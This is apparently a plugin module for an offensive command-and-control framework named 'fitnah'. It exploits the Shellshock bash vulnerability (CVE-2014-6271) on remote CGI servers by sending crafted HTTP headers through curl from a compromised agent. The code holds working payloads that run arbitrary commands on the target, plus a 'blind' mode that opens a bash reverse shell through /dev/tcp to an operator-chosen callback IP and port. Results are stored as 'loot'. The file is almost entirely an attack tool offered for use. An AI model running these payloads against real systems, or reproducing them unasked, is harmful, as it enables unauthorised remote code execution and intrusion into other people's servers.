"""
execution/shellshock — CVE-2014-6271 Shellshock exploitation. MITRE T1190 / T1059.004.
Sends a crafted HTTP request with a Shellshock payload via curl on the agent.
No PowerShell — uses ctx.exec() with curl which is available on all modern Windows/Linux targets.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class ShellshockExploit(BasePlugin):
    NAME        = "shellshock"
    DESCRIPTION = "Exploit CVE-2014-6271 Shellshock on remote CGI targets via curl (no PowerShell). MITRE T1190"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1190"
    CATEGORY    = "execution"

    schema = ParamSchema().add(
        Param("target_url",   str, required=True,
              help="Full URL of CGI endpoint (e.g. http://192.168.1.1/cgi-bin/test.cgi)"),
        Param("command",      str, required=False, default="id",
              help="Shell command to execute on the remote target"),
        Param("header",       str, required=False, default="User-Agent",
              help="HTTP header to inject: User-Agent | Referer | Cookie"),
        Param("mode",         str, required=False, default="exec",
              help="exec (capture output) | blind (fire-and-forget) | detect"),
        Param("callback_ip",  str, required=False, default="",
              help="[blind] Operator IP for reverse shell callback"),
        Param("callback_port", int, required=False, default=4444),
        Param("timeout",       int, required=False, default=15),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        url      = params.get("target_url", "")
        command  = params.get("command", "id")
        header   = params.get("header", "User-Agent")
        mode     = params.get("mode", "exec").lower()
        cb_ip    = params.get("callback_ip", "")
        cb_port  = int(params.get("callback_port", 4444))
        timeout  = int(params.get("timeout", 15))

        if not url:
            return ModuleResult.err("target_url is required")

        if mode == "detect":
            payload = "() { :;}; echo SHELLSHOCK_VULN"
        elif mode == "blind" and cb_ip:
            payload = f"() {{ :;}}; /bin/bash -i >& /dev/tcp/{cb_ip}/{cb_port} 0>&1 &"
        else:
            payload = f"() {{ :;}}; echo Content-Type: text/plain; echo; {command} 2>&1"

        # Use curl — present on Windows 10+, all Linux/macOS targets
        curl_cmd = (
            f'curl -sk --max-time {timeout} '
            f'-H "{header}: {payload}" '
            f'"{url}"'
        )

        r = ctx.exec(curl_cmd)
        if r["status"] != "ok":
            return ModuleResult.err(f"shellshock curl failed: {r['output']}")

        out = r["output"]
        if mode == "detect":
            vuln = "SHELLSHOCK_VULN" in out
            return ModuleResult.ok(
                data=f"[{'VULNERABLE' if vuln else 'NOT VULNERABLE'}] {url}\n{out}",
                loot_kind="shellshock",
            )
        return ModuleResult.ok(data=out, loot_kind="shellshock")
